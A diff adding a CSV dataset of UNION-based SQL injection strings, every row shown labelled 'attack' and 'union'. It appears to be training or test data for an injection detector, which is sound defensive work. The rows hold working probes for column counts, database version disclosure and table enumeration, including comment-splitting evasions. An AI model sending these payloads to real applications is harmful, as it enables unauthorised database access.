@@ -1,0 +1,420 @@
+label,payload,family
+attack," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",union
+attack," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  1 union select 1||1,version  (    )   -- 1",union
+attack," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",union
+attack,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",union
+attack," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",union
+attack," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",union
+attack," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",union
+attack," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",union
+attack," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",union
+attack,1 uni/**/on select all from where,union
+attack," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",union
+attack," select * from users where id  =  '1' union select \#,@@VERSION -- 1'",union
+attack," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",union
+attack," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",union
+attack," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",union
+attack," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",union
+attack," select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",union
+attack," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",union
+attack," select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",union
+attack," select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",union
+attack," union select * from users where login   =   char  (  114,111,111,116  )  ;",union
+attack," select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",union
+attack," select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",union
+attack," select * from users where id  =  1 union select  @ $,version  (    )   -- 1",union
+attack,uni/**/on sel/**/ect,union
+attack," select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",union
+attack," select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",union
+attack," select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",union
+attack," select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",union
+attack," select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",union
+attack,UNION SELECT,union
+attack," select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",union
+attack," select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",union
+attack," select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",union
+attack," select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",union
+attack," select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1",union
+attack," select * from users where id  =  '1' *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1'",union
+attack," select * from users where id  =  1 +   (  \.  )   union select null,@@VERSION -- 1",union
+attack," select * from users where id  =  '1' union select "";""_,version  (    )   -- 1'",union
+attack," select * from users where id  =  1 or 1#""$ union select 'a',version  (    )   -- 1",union
+attack," select * from users where id  =  1 or 1#"", union select 1,version  (    )   -- 1",union
+attack," select * from users where id  =  '1' or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",union
+attack," select * from users where id  =  1 or 1#""; union select version  (    )  ,version  (    )   -- 1",union
+attack," select * from users where id  =  1 or 1#""{ union select 'a',version  (    )   -- 1",union
+attack,"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",union
+attack,"-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#",union
+attack,"-2312'   )    )     )   union all select 5282,5282,5282,5282,5282,5282,5282,5282--",union
+attack,"-8153'  )   as qhlb where 4948  =  4948 union all select 4948,4948,4948,4948,4948,4948#",union
+attack,-9446   )    )    as wmrq where 3705  =  3705 union all select 3705#,union
+attack,"-4984%""   )    )     )   union all select 6980,6980,6980,6980,6980,6980,6980,6980#",union
+attack,"1' union all select null,null,null,null--",union
+attack,"1 union all select null,null#",union
+attack,"1'||  (  select 'wyng' from dual where 2157  =  2157 union all select null,null--",union
+attack,"-3829%""  )   union all select 2218,2218,2218,2218,2218,2218,2218--",union
+attack,"-8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049#",union
+attack,"-9656"" union all select 8735,8735--",union
+attack,"-6333""   )    )     )   union all select 9851,9851,9851,9851,9851,9851--",union
+attack,"1%"" union all select null,null,null,null,null#",union
+attack,"1'  )   as knxr where 5662  =  5662 union all select null,null,null,null,null,null,null,null#",union
+attack,"-3513%"" union all select 8473,8473#",union
+attack,"-9286""   )    )    as mfxl where 9348  =  9348 union all select 9348#",union
+attack,"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",union
+attack,"1   )    )     )   union all select null,null,null,null,null,null--",union
+attack,"1%'   )    )    union all select null,null,null,null#",union
+attack,"1%' union all select null,null,null#",union
+attack,"-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",union
+attack,"-4588"" union all select 4550,4550,4550,4550#",union
+attack,"-5700 where 4238  =  4238 union all select 4238,4238,4238#",union
+attack,"-9440"" union all select 5599,5599,5599,5599,5599--",union
+attack,"-5204""  )   union all select 7186,7186,7186--",union
+attack,"1  )   as estm where 4809  =  4809 union all select null,null,null--",union
+attack,"1""   )    )    union all select null,null,null,null,null,null,null,null,null--",union
+attack,"1'||  (  select 'svgd' from dual where 5188  =  5188 union all select null,null,null,null,null#",union
+attack,"-5052   )    )     )   union all select 8351,8351,8351,8351#",union
+attack,"-3443""   )    )    union all select 4043,4043,4043,4043,4043,4043,4043#",union
+attack,"1""  )   where 6478  =  6478 union all select null,null,null,null,null,null#",union
+attack,"1"" where 1051  =  1051 union all select null--",union
+attack,"1' union all select null,null,null,null#",union
+attack,"-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--",union
+attack,"-2748'   )    )    as gazw where 4624  =  4624 union all select 4624,4624#",union
+attack,"-5661'   )    )    union all select 3011,3011#",union
+attack,"1"" union all select null,null,null#",union
+attack,"1%'   )    )     )   union all select null,null--",union
+attack,"1%"" union all select null,null,null,null,null,null,null#",union
+attack,"1'+  (  select 'aphz' where 1933  =  1933 union all select null,null,null,null,null,null#",union
+attack,-2869'   )    )    union all select 3216--,union
+attack,"-9821  )   as qqrm where 7152  =  7152 union all select 7152,7152,7152,7152--",union
+attack,"1%"" union all select null,null#",union
+attack,"-8868""  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",union
+attack,"-3215""  )   union all select 4457,4457,4457,4457,4457#",union
+attack,"-2377%'   )    )     )   union all select 7706,7706--",union
+attack,"-9318""   )    )     )   union all select 5223,5223,5223,5223#",union
+attack,"-3862   )    )    as vqtl where 9629  =  9629 union all select 9629,9629,9629,9629,9629--",union
+attack,"-9531'   )    )     )   union all select 4076,4076#",union
+attack,"-5379'  )   union all select 4294,4294,4294--",union
+attack,"-5622"" where 7970  =  7970 union all select 7970,7970,7970,7970,7970--",union
+attack,"-1485'   )    )     )   union all select 7661,7661,7661,7661,7661--",union
+attack,"-3884"" where 8012  =  8012 union all select 8012,8012#",union
+attack,"1"" union all select null,null,null,null,null#",union
+attack,"1   )    )    as khvx where 7533  =  7533 union all select null,null,null,null,null,null,null,null--",union
+attack,"-3756'  )   union all select 1034,1034,1034--",union
+attack,"-8266%'  )   union all select 8626,8626,8626,8626,8626,8626--",union
+attack,"-6084""   )    )    union all select 7354,7354,7354,7354,7354,7354,7354,7354#",union
+attack,"1""  )   as ssbz where 8885  =  8885 union all select null,null,null,null,null,null,null,null,null--",union
+attack,"-8929%'  )   union all select 9486,9486,9486,9486#",union
+attack,"-2071 union all select 4753,4753--",union
+attack,"-1076 union all select 3959,3959--",union
+attack,"-9353"" where 4607  =  4607 union all select 4607,4607,4607,4607,4607,4607#",union
+attack,"-4222'  )   union all select 9267,9267,9267,9267,9267,9267--",union
+attack,"1 union all select null,null,null#",union
+attack,"1""   )    )     )   union all select null,null,null,null,null,null,null,null--",union
+attack,"-5313""   )    )     )   union all select 9189,9189,9189,9189,9189,9189,9189,9189--",union
+attack,"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",union
+attack,"-5362  )   union all select 7297,7297,7297,7297,7297#",union
+attack,"1""  )   as qayu where 6222  =  6222 union all select null,null,null#",union
+attack,"-3737%"" union all select 4452,4452,4452#",union
+attack,"-6611%""   )    )     )   union all select 8918,8918#",union
+attack,"1'||  (  select 'jnsd' from dual where 2316  =  2316 union all select null,null,null,null,null,null,null#",union
+attack,-7971' union all select 4273#,union
+attack,"-2610%""  )   union all select 7779,7779,7779,7779,7779--",union
+attack,"-5124'+  (  select 'xpww' where 1752  =  1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",union
+attack,"1""  )   where 9461  =  9461 union all select null,null,null,null,null,null,null,null,null#",union
+attack,"1  )   where 7600  =  7600 union all select null,null,null,null,null,null--",union
+attack,"1'   )    )    union all select null,null,null,null--",union
+attack,"-6093'  )   where 9676  =  9676 union all select 9676,9676,9676,9676,9676,9676--",union
+attack,"1""  )   as hfvz where 7186  =  7186 union all select null,null,null,null,null,null#",union
+attack,"-3461""   )    )    union all select 6342,6342,6342,6342,6342,6342#",union
+attack,1' where 8770  =  8770 union all select null--,union
+attack,"1"" where 6347  =  6347 union all select null,null,null,null,null,null,null,null#",union
+attack,"1' in boolean mode  )   union all select null,null,null,null,null--",union
+attack,"-1620   )    )    union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",union
+attack,"1%""   )    )    union all select null--",union
+attack,"1""  )   union all select null,null,null,null--",union
+attack,"-2028'   )    )     )   union all select 8698,8698,8698,8698#",union
+attack,"1' in boolean mode  )   union all select null,null,null,null,null,null--",union
+attack,"-5218  )   union all select 9677,9677#",union
+attack,"-6279'  )   union all select 3026,3026,3026,3026,3026,3026,3026,3026--",union
+attack,-8945   )    )    as fszo where 2320  =  2320 union all select 2320--,union
+attack,"1   )    )    as shmg where 1371  =  1371 union all select null,null,null,null,null,null,null,null,null,null#",union
+attack,"-3315""   )    )     )   union all select 2457,2457,2457,2457,2457,2457--",union
+attack,"1  )   where 2678  =  2678 union all select null,null,null,null,null,null,null,null,null#",union
+attack,"1%""   )    )    union all select null,null,null,null,null,null,null--",union
+attack,"-8312%""   )    )    union all select 4972--",union
+attack,"-2325  )   union all select 4692,4692,4692,4692#",union
+attack,"-5160'  )   as kgjw where 9609  =  9609 union all select 9609,9609--",union
+attack,"-5187""  )   union all select 3373,3373#",union
+attack,"-2423'   )    )     )   union all select 8256,8256,8256,8256,8256,8256,8256,8256--",union
+attack,"-3805""   )    )     )   union all select 9123,9123,9123,9123,9123,9123,9123,9123#",union
+attack,"1%'  )   union all select null,null,null,null#",union
+attack,"-5170'   )    )    as ovbf where 4833  =  4833 union all select 4833,4833,4833,4833--",union
+attack,"-6419 union all select 7008,7008,7008,7008,7008--",union
+attack,"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",union
+attack,"1 union all select null,null,null--",union
+attack,"-8129'   )    )     )   union all select 4531,4531,4531#",union
+attack,"1  )   as mnyy where 4409  =  4409 union all select null,null,null,null--",union
+attack,"-3249'   )    )     )   union all select 6309,6309#",union
+attack,"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",union
+attack,"1'||  (  select 'ativ' from dual where 4746  =  4746 union all select null,null,null,null#",union
+attack,"-4047'||  (  select 'rqta' from dual where 9743  =  9743 union all select 9743,9743,9743#",union
+attack,"1  )   where 9645  =  9645 union all select null,null,null--",union
+attack,"-6656""  )   union all select 3931#",union
+attack,"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",union
+attack,"1'   )    )    as kpdl where 4443  =  4443 union all select null,null,null,null,null,null--",union
+attack,"-4527' union all select 7115,7115#",union
+attack,"1   )    )    union all select null,null,null,null,null,null,null,null,null,null#",union
+attack,"1%'  )   union all select null,null,null,null,null,null,null,null#",union
+attack,"1  )   union all select null,null,null,null--",union
+attack,"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",union
+attack,"-2112 union all select 2995,2995,2995,2995,2995--",union
+attack,"1"" union all select null,null,null,null,null,null--",union
+attack,"-9873"" union all select 8020,8020,8020,8020,8020,8020#",union
+attack,"1 where 8045  =  8045 union all select null,null,null--",union
+attack,"1%""  )   union all select null,null,null,null,null,null,null,null,null,null#",union
+attack,"-4972'   )    )    as kfzc where 8817  =  8817 union all select 8817,8817,8817,8817,8817,8817--",union
+attack,"-5698'   )    )    as egjr where 5586  =  5586 union all select 5586,5586,5586--",union
+attack,"-2979'   )    )    as klou where 7092  =  7092 union all select 7092,7092--",union
+attack,"1'  )   union all select null,null#",union
+attack,"1""  )   union all select null,null#",union
+attack,"-4168'  )   union all select 2618,2618#",union
+attack,"1'   )    )     )   union all select null,null,null,null,null,null,null--",union
+attack,"-8200%""   )    )    union all select 7538,7538,7538#",union
+attack,"-6854"" where 7794  =  7794 union all select 7794,7794--",union
+attack,"-8136'  )   union all select 1324,1324,1324,1324#",union
+attack,"-2222' in boolean mode  )   union all select 7649,7649,7649,7649,7649,7649,7649,7649--",union
+attack,"-3525"" where 3522  =  3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",union
+attack,"1%' union all select null,null#",union
+attack,"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#",union
+attack,"-6145'+  (  select nnjn where 1389  =  1389 union all select 1389,1389,1389--",union
+attack,"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",union
+attack,"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",union
+attack,"-7981%"" union all select 4532,4532,4532,4532,4532,4532,4532#",union
+attack,"-4427'   )    )    union all select 6357,6357,6357,6357,6357#",union
+attack,"1"" union all select null--",union
+attack,"-1859' union all select 1781,1781,1781,1781#",union
+attack,"-2216""  )   where 6692  =  6692 union all select 6692,6692,6692#",union
+attack,"1'+  (  select sxco where 1623  =  1623 union all select null,null--",union
+attack,"1""   )    )    union all select null,null--",union
+attack,"1""   )    )    as qejm where 9014  =  9014 union all select null,null,null,null,null,null#",union
+attack,"-9697  )   union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",union
+attack,"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--",union
+attack,"-6942'  )   union all select 7280,7280,7280#",union
+attack,"-7876%'  )   union all select 3909,3909,3909,3909,3909#",union
+attack,"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",union
+attack,"-2418'||  (  select 'mdbt' from dual where 3026  =  3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",union
+attack,"-7448 union all select 4072,4072#",union
+attack,"1""  )   where 7840  =  7840 union all select null,null#",union
+attack,"-8133'  )   union all select 6417,6417,6417,6417,6417,6417,6417,6417--",union
+attack,"1%'   )    )     )   union all select null,null,null,null,null,null--",union
+attack,"-7511   )    )    as xqzf where 9939  =  9939 union all select 9939,9939,9939,9939,9939,9939,9939--",union
+attack,"-6595   )    )     )   union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",union
+attack,"-9871""  )   union all select 9082#",union
+attack,"1   )    )    as gobw where 3496  =  3496 union all select null,null,null,null,null,null,null,null,null--",union
+attack,"-6249'   )    )     )   union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",union
+attack,"1'||  (  select 'xbvz' from dual where 1632  =  1632 union all select null,null,null,null,null,null,null,null--",union
+attack,"-9160'  )   union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",union
+attack,"-4176'+  (  select 'muio' where 4256  =  4256 union all select 4256,4256,4256,4256,4256,4256#",union
+attack,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null--",union
+attack,"1%"" union all select null--",union
+attack,-1816%'   )    )     )   union all select 2072--,union
+attack,"1%""  )   union all select null,null,null,null,null,null,null--",union
+attack,"-5041'   )    )     )   union all select 4820,4820,4820,4820,4820,4820--",union
+attack,"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",union
+attack,"-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",union
+attack,"1"" where 1852  =  1852 union all select null,null,null,null,null,null,null,null,null#",union
+attack,"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",union
+attack,"1""  )   as doai where 7024  =  7024 union all select null,null,null,null,null,null,null,null--",union
+attack,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
+attack,"1%""  )   union all select null,null,null,null,null,null,null,null,null--",union
+attack,"1""  )   where 6367  =  6367 union all select null,null,null,null,null,null,null#",union
+attack,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",union
+attack,"-1174"" union all select 4303,4303,4303,4303#",union
+attack,"-2840'   )    )     )   union all select 3025,3025,3025,3025--",union
+attack,"-8888%'  )   union all select 5312,5312,5312,5312,5312,5312,5312,5312--",union
+attack,"-1490'||  (  select 'uzbm' from dual where 3181  =  3181 union all select 3181,3181,3181,3181,3181--",union
+attack,"1 union all select null,null,null,null,null,null,null,null,null,null#",union
+attack,"1'  )   union all select null,null--",union
+attack,"1'   )    )    as nuku where 7009  =  7009 union all select null,null,null,null,null#",union
+attack,"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",union
+attack,"-2007%'   )    )    union all select 7298,7298,7298#",union
+attack,1  )   as uhmm where 2304  =  2304 union all select null#,union
+attack,"1%""   )    )    union all select null,null,null,null#",union
+attack,1   )    )    union all select null--,union
+attack,"1'  )   as asjj where 1721  =  1721 union all select null,null,null,null,null,null--",union
+attack,"-4286%""   )    )     )   union all select 2229,2229,2229,2229,2229,2229#",union
+attack,"-1148""   )    )    union all select 5442,5442,5442,5442#",union
+attack,"-5078 union all select 9708,9708--",union
+attack,"-7350'   )    )     )   union all select 9207,9207,9207,9207--",union
+attack,"-1908""  )   where 6420  =  6420 union all select 6420,6420,6420,6420--",union
+attack,"-7737'||  (  select 'xalo' where 9219  =  9219 union all select 9219,9219,9219,9219#",union
+attack,"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",union
+attack,"-6453""   )    )    as hehs where 9363  =  9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",union
+attack,"1"" union all select null,null,null,null,null--",union
+attack,"-7412""  )   as qngt where 2041  =  2041 union all select 2041--",union
+attack,"-6412   )    )    as cnfs where 6557  =  6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",union
+attack,"-6381%""   )    )     )   union all select 1503,1503,1503,1503#",union
+attack,"1""  )   where 1416  =  1416 union all select null,null,null#",union
+attack,"-5573'  )   union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",union
+attack,"-5652%'  )   union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",union
+attack,"-5911 union all select 2245,2245,2245,2245,2245,2245#",union
+attack,"-4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488--",union
+attack,"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",union
+attack,"1""  )   as lgxc where 1117  =  1117 union all select null,null,null,null,null,null,null,null#",union
+attack,"-4739'   )    )    union all select 6585,6585,6585,6585,6585--",union
+attack,"1""  )   as yphz where 8174  =  8174 union all select null,null,null,null,null,null,null--",union
+attack,-2214'  )   union all select 8228#,union
+attack,"-3979' in boolean mode  )   union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",union
+attack,"-7006' where 6966  =  6966 union all select 6966,6966,6966,6966#",union
+attack,"-7258""  )   as wjjr where 2110  =  2110 union all select 2110,2110,2110,2110,2110,2110,2110,2110,2110--",union
+attack,"1'+  (  select 'mtpt' where 7483  =  7483 union all select null,null,null,null,null,null,null,null,null--",union
+attack,"-9015%""  )   union all select 6948,6948--",union
+attack,"1 where 2914  =  2914 union all select null,null,null#",union
+attack,"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",union
+attack,"-9634'   )    )     )   union all select 4141,4141#",union
+attack,"1""  )   as uuth where 8555  =  8555 union all select null,null#",union
+attack,"-9861' union all select 5710,5710,5710,5710,5710--",union
+attack,"-6112""  )   union all select 8203,8203,8203,8203,8203,8203,8203--",union
+attack,"-3604'  )   as fyev where 7259  =  7259 union all select 7259,7259,7259,7259--",union
+attack,"1  )   as guru where 7615  =  7615 union all select null,null,null,null,null,null,null,null,null,null#",union
+attack,"1'   )    )    union all select null,null,null--",union
+attack,"-1692'  )   union all select 7074,7074,7074,7074,7074,7074,7074#",union
+attack,"-9924   )    )    as zgqa where 2867  =  2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",union
+attack,"-8655  )   where 3910  =  3910 union all select 3910,3910#",union
+attack,"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",union
+attack,"1' union all select null,null,null,null,null,null,null#",union
+attack,"-9451%""  )   union all select 9963,9963,9963--",union
+attack,"-8054'   )    )    union all select 5232,5232,5232,5232,5232,5232,5232#",union
+attack,"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",union
+attack,"-6581'||  (  select 'hpjd' where 7608  =  7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",union
+attack,"-3518  )   union all select 1877,1877,1877,1877#",union
+attack,"-5198   )    )     )   union all select 7089,7089,7089,7089,7089,7089,7089,7089#",union
+attack,"-7307'   )    )    union all select 5215,5215,5215,5215--",union
+attack,"-5989%"" union all select 3581,3581,3581,3581,3581--",union
+attack,"1'||  (  select 'xbwg' where 7518  =  7518 union all select null,null,null,null,null,null--",union
+attack,"-5606  )   union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",union
+attack,"1   )    )    as jmcp where 8624  =  8624 union all select null,null,null,null,null,null,null,null,null,null--",union
+attack,"1%""  )   union all select null,null,null,null,null,null--",union
+attack,"1"" where 7290  =  7290 union all select null,null,null,null,null,null,null--",union
+attack,"1'||  (  select 'tkmc' from dual where 9675  =  9675 union all select null,null,null,null--",union
+attack,-6327'   )    )    union all select 2685--,union
+attack,"-8309'||  (  select 'qecl' where 8449  =  8449 union all select 8449,8449,8449,8449,8449,8449,8449--",union
+attack,"-3321"" where 1603  =  1603 union all select 1603,1603,1603,1603#",union
+attack,"1"" where 1765  =  1765 union all select null,null,null,null,null,null#",union
+attack,-5039 union all select 2114#,union
+attack,"1%' union all select null,null,null,null#",union
+attack,"-9098' union all select 3476,3476,3476,3476,3476,3476#",union
+attack,"1%""   )    )     )   union all select null,null--",union
+attack,"-1256' in boolean mode  )   union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",union
+attack,"-1275"" union all select 7861,7861,7861,7861,7861#",union
+attack,"1%'  )   union all select null,null,null,null--",union
+attack,"-4798""   )    )     )   union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",union
+attack,"1'   )    )     )   union all select null,null,null,null,null,null,null,null#",union
+attack,"1%""  )   union all select null,null,null#",union
+attack,"1%""   )    )     )   union all select null,null#",union
+attack,"1""  )   where 3058  =  3058 union all select null--",union
+attack,"1   )    )    union all select null,null,null,null,null,null,null,null,null#",union
+attack,"1   )    )    union all select null,null,null#",union
+attack,"1%"" union all select null,null,null,null,null,null,null,null,null#",union
+attack,"-3758'   )    )    union all select 9460,9460,9460,9460,9460,9460,9460,9460--",union
+attack,"-9014%'  )   union all select 4211,4211,4211,4211,4211,4211#",union
+attack,"-7950 where 9619  =  9619 union all select 9619,9619,9619,9619--",union
+attack,"1'   )    )     )   union all select null,null,null,null#",union
+attack,"-7126'   )    )    as fzpp where 8078  =  8078 union all select 8078,8078,8078,8078,8078,8078,8078#",union
+attack,"1'  )   union all select null,null,null#",union
+attack,"1  )   as jvuo where 6859  =  6859 union all select null,null,null,null,null,null,null#",union
+attack,"-8109%""   )    )    union all select 9089,9089--",union
+attack,"-9007  )   as gill where 6462  =  6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",union
+attack,"-6731"" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166--",union
+attack,"-9886%'   )    )     )   union all select 5191,5191,5191,5191,5191,5191,5191--",union
+attack,"-4223'   )    )     )   union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",union
+attack,"-1238'  )   as lxur where 7075  =  7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#",union
+attack,"1%""   )    )    union all select null,null,null,null,null,null--",union
+attack,"1""   )    )    as bovm where 5560  =  5560 union all select null,null,null,null,null,null,null#",union
+attack,"-6599""   )    )    union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",union
+attack,"-3913"" where 6085  =  6085 union all select 6085,6085,6085,6085,6085,6085,6085#",union
+attack,"1%""   )    )     )   union all select null--",union
+attack,"1' union all select null,null,null#",union
+attack,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
+attack,-8553'+  (  select adko where 1750  =  1750 union all select 1750#,union
+attack,"1'||  (  select 'mzhj' where 9677  =  9677 union all select null,null,null--",union
+attack,"-2601'  )   union all select 2866,2866,2866,2866,2866,2866--",union
+attack,"1""   )    )    union all select null,null,null--",union
+attack,"1""   )    )    as rrms where 8185  =  8185 union all select null,null,null,null,null,null,null,null--",union
+attack,"-8203   )    )    as eqlf where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",union
+attack,"1'+  (  select immd where 7499  =  7499 union all select null,null,null,null,null,null,null,null#",union
+attack,1'+  (  select nash where 4159  =  4159 union all select null#,union
+attack,"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",union
+attack,"-9630%"" union all select 8592,8592,8592,8592--",union
+attack,"-2296"" union all select 7359,7359,7359,7359,7359,7359#",union
+attack,"-7676""   )    )    as flov where 7967  =  7967 union all select 7967--",union
+attack,"1'   )    )    union all select null,null,null,null#",union
+attack,"-2168""   )    )    union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",union
+attack,"-1585%""   )    )    union all select 8818,8818,8818,8818,8818,8818#",union
+attack,"1   )    )     )   union all select null,null,null,null,null#",union
+attack,"1"" where 2235  =  2235 union all select null,null,null,null,null--",union
+attack,"-6368   )    )    union all select 4646,4646,4646,4646,4646,4646,4646--",union
+attack,"1"" union all select null,null,null,null,null,null,null,null,null,null--",union
+attack,"1  )   union all select null,null,null,null,null,null,null,null#",union
+attack,-2793'  )   where 2621  =  2621 union all select 2621#,union
+attack,"1  )   as lhie where 4631  =  4631 union all select null,null,null,null,null--",union
+attack,"1'+  (  select 'ixza' where 4374  =  4374 union all select null,null,null--",union
+attack,"1'   )    )    as ezpq where 2976  =  2976 union all select null,null,null,null,null,null,null,null,null,null#",union
+attack,-8878' in boolean mode  )   union all select 7785#,union
+attack,"-4477'   )    )    union all select 8444,8444,8444,8444,8444,8444,8444,8444--",union
+attack,"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",union
+attack,"-7499%""  )   union all select 1893,1893,1893,1893,1893#",union
+attack,"-8703'  )   where 9723  =  9723 union all select 9723,9723,9723,9723,9723#",union
+attack,"-9587 union all select 1568,1568,1568,1568,1568,1568#",union
+attack,"-4091""   )    )     )   union all select 6694,6694--",union
+attack,"-6405' union all select 8235,8235,8235,8235,8235#",union
+attack,"-5193 where 2175  =  2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",union
+attack,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null,null--",union
+attack,"1  )   where 7775  =  7775 union all select null,null,null,null--",union
+attack,"1'||  (  select 'fqoz' where 9794  =  9794 union all select null,null,null,null,null--",union
+attack,"-4329'  )   union all select 1353,1353,1353,1353,1353,1353#",union
+attack,"-8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#",union
+attack,"-3031"" union all select 2681#",union
+attack,"-5143'+  (  select 'zyrr' where 8405  =  8405 union all select 8405,8405,8405,8405#",union
+attack,"-8200' in boolean mode  )   union all select 3360,3360--",union
+attack,"-3767'  )   as eefl where 8260  =  8260 union all select 8260,8260,8260,8260,8260,8260,8260#",union
+attack,"-6548%""  )   union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",union
+attack,"-9569%'   )    )    union all select 8405,8405,8405,8405--",union
+attack,"-6457 where 1764  =  1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--",union
+attack,"-1748%""   )    )     )   union all select 2987#",union
+attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null#",union
+attack,1'||  (  select 'puco' where 2605  =  2605 union all select null#,union
+attack,"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",union
+attack,"1'||  (  select 'jonh' from dual where 2415  =  2415 union all select null,null,null,null,null,null,null,null,null--",union
+attack,"-9023%""   )    )     )   union all select 4490,4490,4490#",union
